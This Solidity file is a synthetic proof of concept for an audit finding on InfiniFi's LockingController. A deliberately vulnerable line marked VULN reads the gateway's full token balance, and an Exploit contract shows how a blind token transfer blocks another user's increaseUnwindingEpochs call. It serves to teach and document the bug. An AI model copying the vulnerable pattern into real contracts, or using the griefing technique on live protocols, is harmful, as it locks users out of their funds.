// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  InfiniFi — Referencing the gateway balance in
    LockingController.increaseUnwindingEpochs can DoS the function
    (R0bert / Spearbit March 2025, finding #55052)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: increaseUnwindingEpochs reads the gateway's entire
    LockedPositionToken balance and tries to burn that amount. Tokens are
    freely transferable, so Bob can blind-transfer his position to the gateway.
    Alice later calls increaseUnwindingEpochs after depositing only her own
    shares and approving only her amount; burnFrom reverts because the
    controller attempts to burn alice+bob. Alice is DoSed.

    Vulnerable balanceOf(gateway) pattern preserved with @> VULN marker.
    FIX: pass shares = balanceOf(msg.sender) from the gateway as an argument. */

contract LockedPositionToken {
    string public name;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    constructor(string memory name_) {
        name = name_;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function burnFrom(address from, uint256 amt) external {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amt, "burn allowance");
        allowance[from][msg.sender] = allowed - amt;
        require(balanceOf[from] >= amt, "burn balance");
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }
}

/// @notice User wallet that holds position tokens and can transfer/approve.
contract User {
    function transferToken(LockedPositionToken t, address to, uint256 amt) external {
        t.transfer(to, amt);
    }

    function approveToken(LockedPositionToken t, address spender, uint256 amt) external {
        t.approve(spender, amt);
    }
}

contract LockingController {
    mapping(uint256 => LockedPositionToken) public shareToken;
    mapping(address => mapping(uint256 => uint256)) public shares;
    mapping(address => uint256) public rewardWeight;
    address public gateway;

    // Tokens created in constructor — their CREATE nonces belong to this contract.
    constructor() {
        shareToken[10] = new LockedPositionToken("liUSD-10");
        shareToken[12] = new LockedPositionToken("liUSD-12");
    }

    function setGateway(address g) external {
        gateway = g;
    }

    function createPosition(address user, uint256 amount, uint256 epochs) external {
        LockedPositionToken t = shareToken[epochs];
        t.mint(user, amount);
        shares[user][epochs] += amount;
        rewardWeight[user] += amount + (amount * epochs) / 50;
    }

    function balanceOf(address user) external view returns (uint256) {
        return shares[user][10] + shares[user][12];
    }

    /// @dev Vulnerable increaseUnwindingEpochs (LockingController.sol#L253).
    function increaseUnwindingEpochs(uint256 fromEpoch, uint256 toEpoch) external {
        require(msg.sender == gateway, "only gateway");
        LockedPositionToken fromTok = shareToken[fromEpoch];
        LockedPositionToken toTok = shareToken[toEpoch];

        // FIX: gateway should pass uint256 shares = liusd.balanceOf(msg.sender).
        uint256 amount = fromTok.balanceOf(gateway); // @> VULN: gateway balance includes blind transfers

        fromTok.burnFrom(gateway, amount);
        toTok.mint(gateway, amount);
    }
}

contract Gateway {
    LockingController public immutable controller;

    constructor(LockingController c) {
        controller = c;
    }

    function approveController(LockedPositionToken t, uint256 amt) external {
        t.approve(address(controller), amt);
    }

    function increaseUnwindingEpochs(uint256 fromEpoch, uint256 toEpoch) external {
        controller.increaseUnwindingEpochs(fromEpoch, toEpoch);
        LockedPositionToken toTok = controller.shareToken(toEpoch);
        uint256 bal = toTok.balanceOf(address(this));
        if (bal > 0) {
            // Would return to msg.sender on success — never reached under the bug.
            toTok.transfer(msg.sender, bal);
        }
    }
}

contract Exploit {
    LockingController public controller; // CREATE nonce 1 (tokens inner to controller)
    Gateway public gateway; // CREATE nonce 2
    User public alice; // CREATE nonce 3
    User public bob; // CREATE nonce 4

    LockedPositionToken public liusd10;
    bool public aliceIncreaseReverted;
    uint256 public gatewayBalanceBefore;

    constructor() {
        controller = new LockingController();
        gateway = new Gateway(controller);
        controller.setGateway(address(gateway));
        alice = new User();
        bob = new User();
        liusd10 = controller.shareToken(10);
    }

    function run() external {
        // Alice and Bob each create a 1000-share position at epoch 10.
        controller.createPosition(address(alice), 1000, 10);
        controller.createPosition(address(bob), 1000, 10);

        // Bob blind-transfers his position tokens to the gateway.
        bob.transferToken(liusd10, address(gateway), 1000);

        // Alice deposits her 1000 shares to the gateway and approves burn of 1000.
        alice.transferToken(liusd10, address(gateway), 1000);
        // Gateway approves controller for only Alice's 1000 (mirrors alice's intent).
        gateway.approveController(liusd10, 1000);

        gatewayBalanceBefore = liusd10.balanceOf(address(gateway));
        require(gatewayBalanceBefore == 2000, "gateway should hold alice+bob");

        // Alice attempts increaseUnwindingEpochs — REVERTS: controller tries to
        // burnFrom(gateway, 2000) but allowance is only 1000.
        aliceIncreaseReverted = !_tryIncrease();

        // HARM: Alice is DoSed for increaseUnwindingEpochs while third-party
        // tokens sit on the gateway.
        require(aliceIncreaseReverted, "harm not demonstrated: alice should be DoSed");
        require(controller.shares(address(alice), 10) == 1000, "alice epoch-10 shares stuck");
        require(controller.shares(address(alice), 12) == 0, "alice should not have epoch-12");
    }

    function _tryIncrease() internal returns (bool ok) {
        try gateway.increaseUnwindingEpochs(10, 12) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}
